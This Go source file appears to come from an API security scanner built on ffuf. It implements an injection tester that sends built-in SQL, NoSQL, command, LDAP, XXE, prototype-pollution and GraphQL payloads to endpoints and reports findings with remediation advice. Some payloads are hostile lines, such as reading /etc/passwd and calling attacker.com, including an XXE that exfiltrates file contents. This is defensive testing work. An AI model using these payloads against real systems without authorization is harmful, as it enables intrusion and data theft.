// Package security provides testing modules for API security vulnerabilities.
package security

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/ffuf/ffuf/v2/pkg/ffuf"
	"github.com/ffuf/ffuf/v2/pkg/runner"
)

// InjectionTester implements testing for Injection (API8:2019)
type InjectionTester struct {
	// Configuration options
	SQLInjectionPayloads    []string
	NoSQLInjectionPayloads  []string
	CommandInjectionPayloads []string
	LDAPInjectionPayloads   []string
	XMLInjectionPayloads    []string
	JSONInjectionPayloads   []string
	GraphQLInjectionPayloads []string
}

// NewInjectionTester creates a new tester for Injection
func NewInjectionTester() *InjectionTester {
	return &InjectionTester{
		SQLInjectionPayloads: []string{
			"' OR '1'='1", // Basic SQL injection
			"' OR '1'='1' --", // SQL injection with comment
			"' OR 1=1 --", // SQL injection with comment
			"' OR 1=1#", // SQL injection with comment
			"' OR 1=1/*", // SQL injection with comment
			"') OR ('1'='1", // SQL injection with parentheses
			"')) OR (('1'='1", // SQL injection with multiple parentheses
			"' UNION SELECT NULL, NULL, NULL, NULL, NULL --", // UNION-based SQL injection
			"' UNION SELECT @@version, NULL, NULL, NULL, NULL --", // UNION-based SQL injection with version
			"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --", // Error-based SQL injection
			"' AND SLEEP(5) --", // Time-based SQL injection
			"' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", // Time-based SQL injection
			"' AND IF(1=1, SLEEP(5), 0) --", // Time-based SQL injection
			"' AND BENCHMARK(10000000,MD5(1)) --", // Time-based SQL injection
			"' OR EXISTS(SELECT * FROM users WHERE username='admin') --", // Boolean-based SQL injection
		},
		NoSQLInjectionPayloads: []string{
			`{"$gt": ""}`, // MongoDB injection
			`{"$ne": null}`, // MongoDB injection
			`{"$exists": true}`, // MongoDB injection
			`{"$in": [null, ""]}`, // MongoDB injection
			`{"$regex": ".*"}`, // MongoDB injection
			`{"$where": "this.password.match(/.*/)"}`, // MongoDB injection
			`{"username": {"$regex": "^admin"}}`, // MongoDB injection
			`{"username": {"$nin": []}}`, // MongoDB injection
			`{"username": {"$not": {"$eq": "invalid"}}}`, // MongoDB injection
		},
		CommandInjectionPayloads: []string{
			"; ls -la", // Basic command injection
			"& ls -la", // Basic command injection
			"&& ls -la", // Basic command injection
			"| ls -la", // Basic command injection
			"|| ls -la", // Basic command injection
			"` ls -la `", // Basic command injection
			"$(ls -la)", // Basic command injection
			"; cat /etc/passwd", // Command injection to read sensitive files
			"; ping -c 5 127.0.0.1", // Command injection with ping
			"; sleep 5", // Time-based command injection
			"; echo 'test' > /tmp/test", // Command injection with file write
			"; curl http://attacker.com/", // Command injection with network access
		},
		LDAPInjectionPayloads: []string{
			"*)(uid=*)(|(uid=*", // LDAP injection
			"*)(|(objectClass=*", // LDAP injection
			"*)(|(objectClass=person)(objectClass=*", // LDAP injection
			"*)(cn=*))%00", // LDAP injection with null byte
			"*)(|(password=*))", // LDAP injection
			"*)(|(mail=*))", // LDAP injection
			"*)(|(sn=*))", // LDAP injection
		},
		XMLInjectionPayloads: []string{
			"<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>", // XXE injection
			"<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><test>&xxe;</test>", // XXE injection with external entity
			"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>", // XXE injection
			"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>", // XXE injection
			"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % param1 \"file:///etc/passwd\"><!ENTITY % param2 \"http://attacker.com/?%param1;\">%param2;]>", // XXE injection with parameter entities
		},
		JSONInjectionPayloads: []string{
			`{"__proto__": {"polluted": true}}`, // Prototype pollution
			`{"constructor": {"prototype": {"polluted": true}}}`, // Prototype pollution
			`{"__proto__": {"toString": "JSON.stringify(process.env)"}}`, // Prototype pollution with code execution
			`{"__proto__": {"toString": "console.log(process.env)"}}`, // Prototype pollution with code execution
			`{"__proto__": {"toString": "require('child_process').execSync('ls -la')"}}`, // Prototype pollution with command execution
		},
		GraphQLInjectionPayloads: []string{
			`query { __schema { types { name fields { name } } } }`, // GraphQL introspection
			`query { __type(name: "User") { name fields { name type { name kind ofType { name kind } } } } }`, // GraphQL introspection
			`mutation { createUser(input: {username: "admin", password: "password", role: "ADMIN"}) { id } }`, // GraphQL mutation
			`query { user(id: "1 OR 1=1") { id username } }`, // GraphQL with SQL injection
			`query { user(id: {"$ne": null}) { id username } }`, // GraphQL with NoSQL injection
		},
	}
}

// GetType returns the type of vulnerability this tester checks for
func (t *InjectionTester) GetType() VulnerabilityType {
	return VulnInjection
}

// GetName returns the name of the security test
func (t *InjectionTester) GetName() string {
	return "Injection"
}

// GetDescription returns a description of the security test
func (t *InjectionTester) GetDescription() string {
	return "Tests for API endpoints that are vulnerable to injection attacks, where untrusted data is sent to an interpreter as part of a command or query."
}

// Test runs the security test against the target
func (t *InjectionTester) Test(ctx context.Context, config *ffuf.Config) (*TestResult, error) {
	result := &TestResult{
		TestName:  t.GetName(),
		StartTime: time.Now(),
	}

	// Create a runner for making HTTP requests
	r := runner.NewSimpleRunner(config, false)

	// Extract potential endpoints from the config
	endpoints := extractEndpointsFromConfig(config)

	// Test each endpoint for injection vulnerabilities
	for _, endpoint := range endpoints {
		// Test for SQL injection
		t.testSQLInjection(endpoint, r, result)

		// Test for NoSQL injection
		t.testNoSQLInjection(endpoint, r, result)

		// Test for command injection
		t.testCommandInjection(endpoint, r, result)

		// Test for LDAP injection
		t.testLDAPInjection(endpoint, r, result)

		// Test for XML injection
		t.testXMLInjection(endpoint, r, result)

		// Test for JSON injection
		t.testJSONInjection(endpoint, r, result)

		// Test for GraphQL injection
		t.testGraphQLInjection(endpoint, r, result)
	}

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime)
	return result, nil
}

// testSQLInjection tests for SQL injection vulnerabilities
func (t *InjectionTester) testSQLInjection(endpoint string, r ffuf.RunnerProvider, result *TestResult) {
	// Test GET parameters
	t.testSQLInjectionGET(endpoint, r, result)

	// Test POST parameters
	t.testSQLInjectionPOST(endpoint, r, result)
}

// testSQLInjectionGET tests for SQL injection vulnerabilities in GET parameters
func (t *InjectionTester) testSQLInjectionGET(endpoint string, r ffuf.RunnerProvider, result *TestResult) {
	// Extract parameter names from the endpoint
	paramNames := extractParameterNames(endpoint)
	if len(paramNames) == 0 {
		// If no parameters found, try some common ones
		paramNames = []string{"id", "user_id", "username", "email", "search", "query", "q", "filter", "sort", "order", "page", "limit"}
	}

	for _, paramName := range paramNames {
		for _, payload := range t.SQLInjectionPayloads {
			// Create a request with the SQL injection payload
			testURL := addOrReplaceParameter(endpoint, paramName, payload)
			req := &ffuf.Request{
				Method: "GET",
				Url:    testURL,
				Headers: map[string]string{
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				},
			}

			// Execute the request
			resp, err := r.Execute(req)
			if err != nil {
				continue
			}

			// Check if the response indicates a successful SQL injection
			if isSQLInjectionSuccessful(resp) {
				// Create a vulnerability info
				vuln := VulnerabilityInfo{
					Type:        VulnInjection,
					Name:        "SQL Injection",
					Description: "The API endpoint is vulnerable to SQL injection attacks.",
					Severity:    "Critical",
					Request:     convertToHTTPRequest(req),
					Response:    convertToHTTPResponse(resp),
					Evidence:    fmt.Sprintf("SQL injection payload '%s' in parameter '%s' returned a successful response", payload, paramName),
					Remediation: "Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling to avoid exposing database errors.",
					CVSS:        9.8,
					CWE:         "CWE-89",
					References: []string{
						"https://owasp.org/API-Security/editions/2019/en/0xa8-injection/",
						"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
					},
					DetectedAt: time.Now(),
				}
				result.Vulnerabilities = append(result.Vulnerabilities, vuln)
				break // Found a vulnerability, no need to test more payloads for this parameter
			}
		}
	}
}

// testSQLInjectionPOST tests for SQL injection vulnerabilities in POST parameters
func (t *InjectionTester) testSQLInjectionPOST(endpoint string, r ffuf.RunnerProvider, result *TestResult) {
	// Common parameter names for POST requests
	paramNames := []string{"username", "email", "password", "search", "query", "q", "filter", "id", "user_id"}

	for _, paramName := range paramNames {
		for _, payload := range t.SQLInjectionPayloads {
			// Create a JSON payload with the SQL injection
			jsonPayload := fmt.Sprintf(`{"%s":"%s"}`, paramName, payload)

			// Create a request with the SQL injection payload
			req := &ffuf.Request{
				Method: "POST",
				Url:    endpoint,
				Headers: map[string]string{
					"Content-Type": "application/json",
					"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				},
				Data: []byte(jsonPayload),
			}

			// Execute the request
			resp, err := r.Execute(req)
			if err != nil {
				continue
			}

			// Check if the response indicates a successful SQL injection
			if isSQLInjectionSuccessful(resp) {
				// Create a vulnerability info
				vuln := VulnerabilityInfo{
					Type:        VulnInjection,
					Name:        "SQL Injection",
					Description: "The API endpoint is vulnerable to SQL injection attacks.",
					Severity:    "Critical",
					Request:     convertToHTTPRequest(req),
					Response:    convertToHTTPResponse(resp),
					Evidence:    fmt.Sprintf("SQL injection payload '%s' in parameter '%s' returned a successful response", payload, paramName),
					Remediation: "Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Implement proper error handling to avoid exposing database errors.",
					CVSS:        9.8,
					CWE:         "CWE-89",
					References: []string{
						"https://owasp.org/API-Security/editions/2019/en/0xa8-injection/",
						"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
					},
					DetectedAt: time.Now(),
				}
				result.Vulnerabilities = append(result.Vulnerabilities, vuln)
				break // Found a vulnerability, no need to test more payloads for this parameter
			}
		}
	}
}

// testNoSQLInjection tests for NoSQL injection vulnerabilities
func (t *InjectionTester) testNoSQLInjection(endpoint string, r ffuf.RunnerProvider, result *TestResult) {
	// Common parameter names for NoSQL databases
	paramNames := []string{"id", "_id", "user_id", "username", "email", "query", "filter"}

	for _, paramName := range paramNames {
		for _, payload := range t.NoSQLInjectionPayloads {
			// Create a JSON payload with the NoSQL injection
			jsonPayload := fmt.Sprintf(`{"%s":%s}`, paramName, payload)

			// Create a request with the NoSQL injection payload
			req := &ffuf.Request{
				Method: "POST",
				Url:    endpoint,
				Headers: map[string]string{
					"Content-Type": "application/json",
					"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				},
				Data: []byte(jsonPayload),
			}

			// Execute the request
			resp, err := r.Execute(req)
			if err != nil {
				continue
			}

			// Check if the response indicates a successful NoSQL injection
			if isNoSQLInjectionSuccessful(resp) {
				// Create a vulnerability info
				vuln := VulnerabilityInfo{
					Type:        VulnInjection,
					Name:        "NoSQL Injection",
					Description: "The API endpoint is vulnerable to NoSQL injection attacks.",
					Severity:    "Critical",
					Request:     convertToHTTPRequest(req),
					Response:    convertToHTTPResponse(resp),
					Evidence:    fmt.Sprintf("NoSQL injection payload '%s' in parameter '%s' returned a successful response", payload, paramName),
					Remediation: "Validate and sanitize all user inputs. Use query builders or ODM/ORM libraries. Implement proper error handling to avoid exposing database errors.",
					CVSS:        9.0,
					CWE:         "CWE-943",
					References: []string{
						"https://owasp.org/API-Security/editions/2019/en/0xa8-injection/",
						"https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html",
					},
					DetectedAt: time.Now(),
				}
				result.Vulnerabilities = append(result.Vulnerabilities, vuln)
				break // Found a vulnerability, no need to test more payloads for this parameter
			}
		}
	}
}

// testCommandInjection tests for command injection vulnerabilities
func (t *InjectionTester) testCommandInjection(endpoint string, r ffuf.RunnerProvider, result *TestResult) {
	// Common parameter names that might be vulnerable to command injection
	paramNames := []string{"command", "cmd", "exec", "run", "shell", "script", "ping", "host", "ip", "domain", "url", "file", "path", "name"}

	// Test GET parameters
	for _, paramName := range paramNames {
		for _, payload := range t.CommandInjectionPayloads {
			// Create a request with the command injection payload
			testURL := addOrReplaceParameter(endpoint, paramName, payload)
			req := &ffuf.Request{
				Method: "GET",
				Url:    testURL,
				Headers: map[string]string{
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				},
			}

			// Execute the request
			resp, err := r.Execute(req)
			if err != nil {
				continue
			}

			// Check if the response indicates a successful command injection
			if isCommandInjectionSuccessful(resp) {
				// Create a vulnerability info
				vuln := VulnerabilityInfo{
					Type:        VulnInjection,
					Name:        "Command Injection",
					Description: "The API endpoint is vulnerable to command injection attacks.",
					Severity:    "Critical",
					Request:     convertToHTTPRequest(req),
					Response:    convertToHTTPResponse(resp),
					Evidence:    fmt.Sprintf("Command injection payload '%s' in parameter '%s' returned a successful response", payload, paramName),
					Remediation: "Avoid using system commands with user input. If necessary, use a whitelist of allowed commands and validate all inputs. Consider using APIs specific to the language instead of shell commands.",
					CVSS:        9.8,
					CWE:         "CWE-77",
					References: []string{
						"https://owasp.org/API-Security/editions/2019/en/0xa8-injection/",
						"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
					},
					DetectedAt: time.Now(),
				}
				result.Vulnerabilities = append(result.Vulnerabilities, vuln)
				break // Found a vulnerability, no need to test more payloads for this parameter
			}
		}
	}

	// Test POST parameters
	for _, paramName := range paramNames {
		for _, payload := range t.CommandInjectionPayloads {
			// Create a JSON payload with the command injection
			jsonPayload := fmt.Sprintf(`{"%s":"%s"}`, paramName, payload)

			// Create a request with the command injection payload
			req := &ffuf.Request{
				Method: "POST",
				Url:    endpoint,
				Headers: map[string]string{
					"Content-Type": "application/json",
					"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				},
				Data: []byte(jsonPayload),
			}

			// Execute the request
			resp, err := r.Execute(req)
			if err != nil {
				continue
			}

			// Check if the response indicates a successful command injection
			if isCommandInjectionSuccessful(resp) {
				// Create a vulnerability info
				vuln := VulnerabilityInfo{
					Type:        VulnInjection,
					Name:        "Command Injection",
					Description: "The API endpoint is vulnerable to command injection attacks.",
					Severity:    "Critical",
					Request:     convertToHTTPRequest(req),
					Response:    convertToHTTPResponse(resp),
					Evidence:    fmt.Sprintf("Command injection payload '%s' in parameter '%s' returned a successful response", payload, paramName),
					Remediation: "Avoid using system commands with user input. If necessary, use a whitelist of allowed commands and validate all inputs. Consider using APIs specific to the language instead of shell commands.",
					CVSS:        9.8,
					CWE:         "CWE-77",
					References: []string{
						"https://owasp.org/API-Security/editions/2019/en/0xa8-injection/",
						"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
					},
					DetectedAt: time.Now(),
				}
				result.Vulnerabilities = append(result.Vulnerabilities, vuln)
				break // Found a vulnerability, no need to test more payloads for this parameter
			}
		}
	}
}

// testLDAPInjection tests for LDAP injection vulnerabilities
func (t *InjectionTester) testLDAPInjection(endpoint string, r ffuf.RunnerProvider, result *TestResult) {
	// Common parameter names that might be vulnerable to LDAP injection
	paramNames := []string{"username", "user", "email", "cn", "dn", "uid", "filter", "search", "query"}

	// Test GET parameters
	for _, paramName := range paramNames {
		for _, payload := range t.LDAPInjectionPayloads {
			// Create a request with the LDAP injection payload
			testURL := addOrReplaceParameter(endpoint, paramName, payload)
			req := &ffuf.Request{
				Method: "GET",
				Url:    testURL,
				Headers: map[string]string{
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				},
			}

			// Execute the request
			resp, err := r.Execute(req)
			if err != nil {
				continue
			}

			// Check if the response indicates a successful LDAP injection
			if isLDAPInjectionSuccessful(resp) {
				// Create a vulnerability info
				vuln := VulnerabilityInfo{
					Type:        VulnInjection,
					Name:        "LDAP Injection",
					Description: "The API endpoint is vulnerable to LDAP injection attacks.",
					Severity:    "High",
					Request:     convertToHTTPRequest(req),
					Response:    convertToHTTPResponse(resp),
					Evidence:    fmt.Sprintf("LDAP injection payload '%s' in parameter '%s' returned a successful response", payload, paramName),
					Remediation: "Validate and sanitize all user inputs. Use proper LDAP encoding for special characters. Consider using LDAP libraries that support parameterized queries.",
					CVSS:        8.0,
					CWE:         "CWE-90",
					References: []string{
						"https://owasp.org/API-Security/editions/2019/en/0xa8-injection/",
						"https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html",
					},
					DetectedAt: time.Now(),
				}
				result.Vulnerabilities = append(result.Vulnerabilities, vuln)
				break // Found a vulnerability, no need to test more payloads for this parameter
			}
		}
	}
}

// testXMLInjection tests for XML injection vulnerabilities
func (t *InjectionTester) testXMLInjection(endpoint string, r ffuf.RunnerProvider, result *TestResult) {
	// Test only if the endpoint accepts XML
	for _, payload := range t.XMLInjectionPayloads {
		// Create a request with the XML injection payload
		req := &ffuf.Request{
			Method: "POST",
			Url:    endpoint,
			Headers: map[string]string{
				"Content-Type": "application/xml",
				"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
			},
			Data: []byte(payload),
		}

		// Execute the request
		resp, err := r.Execute(req)
		if err != nil {
			continue
		}

		// Check if the response indicates a successful XML injection
		if isXMLInjectionSuccessful(resp) {
			// Create a vulnerability info
			vuln := VulnerabilityInfo{
				Type:        VulnInjection,
				Name:        "XML Injection (XXE)",
				Description: "The API endpoint is vulnerable to XML External Entity (XXE) injection attacks.",
				Severity:    "Critical",
				Request:     convertToHTTPRequest(req),
				Response:    convertToHTTPResponse(resp),
				Evidence:    fmt.Sprintf("XML injection payload returned a successful response"),
				Remediation: "Disable external entity processing in the XML parser. Use a secure XML parser configuration. Consider using JSON instead of XML when possible.",
				CVSS:        9.0,
				CWE:         "CWE-611",
				References: []string{
					"https://owasp.org/API-Security/editions/2019/en/0xa8-injection/",
					"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
				},
				DetectedAt: time.Now(),
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
			break // Found a vulnerability, no need to test more payloads
		}
	}
}

// testJSONInjection tests for JSON injection vulnerabilities
func (t *InjectionTester) testJSONInjection(endpoint string, r ffuf.RunnerProvider, result *TestResult) {
	// Test only if the endpoint accepts JSON
	for _, payload := range t.JSONInjectionPayloads {
		// Create a request with the JSON injection payload
		req := &ffuf.Request{
			Method: "POST",
			Url:    endpoint,
			Headers: map[string]string{
				"Content-Type": "application/json",
				"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
			},
			Data: []byte(payload),
		}

		// Execute the request
		resp, err := r.Execute(req)
		if err != nil {
			continue
		}

		// Check if the response indicates a successful JSON injection
		if isJSONInjectionSuccessful(resp) {
			// Create a vulnerability info
			vuln := VulnerabilityInfo{
				Type:        VulnInjection,
				Name:        "JSON Injection (Prototype Pollution)",
				Description: "The API endpoint is vulnerable to JSON-based prototype pollution attacks.",
				Severity:    "High",
				Request:     convertToHTTPRequest(req),
				Response:    convertToHTTPResponse(resp),
				Evidence:    fmt.Sprintf("JSON injection payload returned a successful response"),
				Remediation: "Use JSON parsing libraries that protect against prototype pollution. Validate and sanitize all user inputs. Consider using JSON schema validation.",
				CVSS:        8.0,
				CWE:         "CWE-915",
				References: []string{
					"https://owasp.org/API-Security/editions/2019/en/0xa8-injection/",
					"https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa8-injection.md",
				},
				DetectedAt: time.Now(),
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
			break // Found a vulnerability, no need to test more payloads
		}
	}
}

// testGraphQLInjection tests for GraphQL injection vulnerabilities
func (t *InjectionTester) testGraphQLInjection(endpoint string, r ffuf.RunnerProvider, result *TestResult) {
	// Check if the endpoint might be a GraphQL endpoint
	if !isGraphQLEndpoint(endpoint) {
		return
	}

	for _, payload := range t.GraphQLInjectionPayloads {
		// Create a request with the GraphQL injection payload
		req := &ffuf.Request{
			Method: "POST",
			Url:    endpoint,
			Headers: map[string]string{
				"Content-Type": "application/json",
				"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
			},
			Data: []byte(fmt.Sprintf(`{"query": %q}`, payload)),
		}

		// Execute the request
		resp, err := r.Execute(req)
		if err != nil {
			continue
		}

		// Check if the response indicates a successful GraphQL injection
		if isGraphQLInjectionSuccessful(resp) {
			// Create a vulnerability info
			vuln := VulnerabilityInfo{
				Type:        VulnInjection,
				Name:        "GraphQL Injection",
				Description: "The API endpoint is vulnerable to GraphQL injection attacks.",
				Severity:    "High",
				Request:     convertToHTTPRequest(req),
				Response:    convertToHTTPResponse(resp),
				Evidence:    fmt.Sprintf("GraphQL injection payload returned a successful response"),
				Remediation: "Implement proper authorization checks for GraphQL queries. Disable introspection in production. Use query depth limiting and query complexity analysis.",
				CVSS:        8.0,
				CWE:         "CWE-943",
				References: []string{
					"https://owasp.org/API-Security/editions/2019/en/0xa8-injection/",
					"https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
				},
				DetectedAt: time.Now(),
			}
			result.Vulnerabilities = append(result.Vulnerabilities, vuln)
			break // Found a vulnerability, no need to test more payloads
		}
	}
}

// Helper functions

// extractParameterNames extracts parameter names from a URL
func extractParameterNames(url string) []string {
	var paramNames []string
	parts := strings.Split(url, "?")
	if len(parts) > 1 {
		queryString := parts[1]
		params := strings.Split(queryString, "&")
		for _, param := range params {
			nameValue := strings.Split(param, "=")
			if len(nameValue) > 0 {
				paramNames = append(paramNames, nameValue[0])
			}
		}
	}
	return paramNames
}

// addOrReplaceParameter adds or replaces a parameter in a URL
func addOrReplaceParameter(url, paramName, paramValue string) string {
	parts := strings.Split(url, "?")
	baseURL := parts[0]
	var queryString string
	var params []string

	if len(parts) > 1 {
		queryString = parts[1]
		params = strings.Split(queryString, "&")
	}

	paramFound := false
	for i, param := range params {
		nameValue := strings.Split(param, "=")
		if len(nameValue) > 0 && nameValue[0] == paramName {
			params[i] = paramName + "=" + paramValue
			paramFound = true
			break
		}
	}

	if !paramFound {
		params = append(params, paramName+"="+paramValue)
	}

	if len(params) > 0 {
		return baseURL + "?" + strings.Join(params, "&")
	}
	return baseURL + "?" + paramName + "=" + paramValue
}

// isSQLInjectionSuccessful checks if a response indicates a successful SQL injection
func isSQLInjectionSuccessful(resp ffuf.Response) bool {
	// This is a simplified check - in a real implementation, this would be more sophisticated
	responseData := string(resp.Data)

	// Check for SQL error messages
	sqlErrorPatterns := []string{
		"SQL syntax", "mysql_fetch_array", "mysql_fetch_assoc", "mysql_num_rows",
		"mysql_query", "pg_query", "sqlite_query", "ORA-", "Oracle error",
		"Microsoft SQL Server", "ODBC Driver", "DB2 SQL error", "SQLite error",
		"Syntax error", "Unclosed quotation mark", "unterminated quoted string",
		"You have an error in your SQL syntax", "Warning: mysql_",
		"Warning: pg_", "Warning: sqlite_", "Warning: oci_",
	}

	for _, pattern := range sqlErrorPatterns {
		if strings.Contains(responseData, pattern) {
			return true
		}
	}

	// Check for successful authentication bypass
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		successPatterns := []string{
			"admin", "administrator", "superuser", "root", "welcome", "dashboard",
			"logged in", "login successful", "authentication successful", "authorized",
			"token", "jwt", "session", "user", "profile", "account",
		}

		for _, pattern := range successPatterns {
			if strings.Contains(strings.ToLower(responseData), pattern) {
				return true
			}
		}
	}

	return false
}

// isNoSQLInjectionSuccessful checks if a response indicates a successful NoSQL injection
func isNoSQLInjectionSuccessful(resp ffuf.Response) bool {
	// This is a simplified check - in a real implementation, this would be more sophisticated
	responseData := string(resp.Data)

	// Check for NoSQL error messages
	noSQLErrorPatterns := []string{
		"MongoDB", "CouchDB", "Cassandra", "DynamoDB", "Redis",
		"BSON", "ObjectId", "Mongoose", "Mongo", "Dynamo",
		"$where", "$ne", "$gt", "$lt", "$in", "$nin", "$or", "$and",
		"uncaught exception", "cannot use $", "invalid operator",
	}

	for _, pattern := range noSQLErrorPatterns {
		if strings.Contains(responseData, pattern) {
			return true
		}
	}

	// Check for successful authentication bypass
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		successPatterns := []string{
			"admin", "administrator", "superuser", "root", "welcome", "dashboard",
			"logged in", "login successful", "authentication successful", "authorized",
			"token", "jwt", "session", "user", "profile", "account",
		}

		for _, pattern := range successPatterns {
			if strings.Contains(strings.ToLower(responseData), pattern) {
				return true
			}
		}
	}

	return false
}

// isCommandInjectionSuccessful checks if a response indicates a successful command injection
func isCommandInjectionSuccessful(resp ffuf.Response) bool {
	// This is a simplified check - in a real implementation, this would be more sophisticated
	responseData := string(resp.Data)

	// Check for command output patterns
	commandOutputPatterns := []string{
		"root:x:", "bin:x:", "daemon:x:", "nobody:x:", // /etc/passwd
		"total ", "drwxr-xr-x", "drwxrwxr-x", "-rw-r--r--", // ls -la output
		"uid=", "gid=", "groups=", // id command output
		"PING ", "bytes from", "icmp_seq=", "ttl=", // ping output
		"Linux ", "Darwin ", "Windows ", "BSD ", // uname output
		"CPU:", "Memory:", "Disk:", "Load:", // system info
	}

	for _, pattern := range commandOutputPatterns {
		if strings.Contains(responseData, pattern) {
			return true
		}
	}

	return false
}

// isLDAPInjectionSuccessful checks if a response indicates a successful LDAP injection
func isLDAPInjectionSuccessful(resp ffuf.Response) bool {
	// This is a simplified check - in a real implementation, this would be more sophisticated
	responseData := string(resp.Data)

	// Check for LDAP error messages
	ldapErrorPatterns := []string{
		"LDAP", "ldap_", "389 Directory Server", "Active Directory",
		"OpenLDAP", "directory server", "invalid filter", "search filter",
		"objectClass", "objectCategory", "distinguishedName", "cn=", "ou=", "dc=",
	}

	for _, pattern := range ldapErrorPatterns {
		if strings.Contains(responseData, pattern) {
			return true
		}
	}

	// Check for successful authentication bypass
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		successPatterns := []string{
			"admin", "administrator", "superuser", "root", "welcome", "dashboard",
			"logged in", "login successful", "authentication successful", "authorized",
			"token", "jwt", "session", "user", "profile", "account",
		}

		for _, pattern := range successPatterns {
			if strings.Contains(strings.ToLower(responseData), pattern) {
				return true
			}
		}
	}

	return false
}

// isXMLInjectionSuccessful checks if a response indicates a successful XML injection
func isXMLInjectionSuccessful(resp ffuf.Response) bool {
	// This is a simplified check - in a real implementation, this would be more sophisticated
	responseData := string(resp.Data)

	// Check for XML error messages
	xmlErrorPatterns := []string{
		"XML", "xml", "entity", "DOCTYPE", "SYSTEM", "PUBLIC",
		"parser error", "parsing error", "syntax error", "not well-formed",
		"root:x:", "bin:x:", "daemon:x:", "nobody:x:", // /etc/passwd
		"file://", "http://", "https://", "ftp://", // URLs in response
	}

	for _, pattern := range xmlErrorPatterns {
		if strings.Contains(responseData, pattern) {
			return true
		}
	}

	return false
}

// isJSONInjectionSuccessful checks if a response indicates a successful JSON injection
func isJSONInjectionSuccessful(resp ffuf.Response) bool {
	// This is a simplified check - in a real implementation, this would be more sophisticated
	responseData := string(resp.Data)

	// Check for JSON error messages
	jsonErrorPatterns := []string{
		"__proto__", "constructor", "prototype", "polluted",
		"SyntaxError", "JSON.parse", "JSON.stringify", "unexpected token",
		"unexpected character", "malformed JSON", "invalid JSON",
	}

	for _, pattern := range jsonErrorPatterns {
		if strings.Contains(responseData, pattern) {
			return true
		}
	}

	return false
}

// isGraphQLEndpoint checks if an endpoint might be a GraphQL endpoint
func isGraphQLEndpoint(endpoint string) bool {
	return strings.Contains(strings.ToLower(endpoint), "graphql") ||
		strings.Contains(strings.ToLower(endpoint), "graph") ||
		strings.HasSuffix(strings.ToLower(endpoint), "/query") ||
		strings.HasSuffix(strings.ToLower(endpoint), "/api")
}

// isGraphQLInjectionSuccessful checks if a response indicates a successful GraphQL injection
func isGraphQLInjectionSuccessful(resp ffuf.Response) bool {
	// This is a simplified check - in a real implementation, this would be more sophisticated
	responseData := string(resp.Data)

	// Check for GraphQL-specific patterns
	graphQLPatterns := []string{
		"__schema", "__type", "__typename", "types", "fields", "kind", "name",
		"description", "interfaces", "possibleTypes", "enumValues", "inputFields",
		"ofType", "defaultValue", "directives", "locations", "args",
		"errors", "message", "locations", "path", "extensions",
	}

	// Count how many GraphQL patterns are found
	patternCount := 0
	for _, pattern := range graphQLPatterns {
		if strings.Contains(responseData, pattern) {
			patternCount++
		}
	}

	// If multiple GraphQL patterns are found, it's likely a successful injection
	return patternCount >= 3 && resp.StatusCode >= 200 && resp.StatusCode < 300
}

func init() {
	// Register the tester with the default registry
	RegisterSecurityTester(NewInjectionTester())
}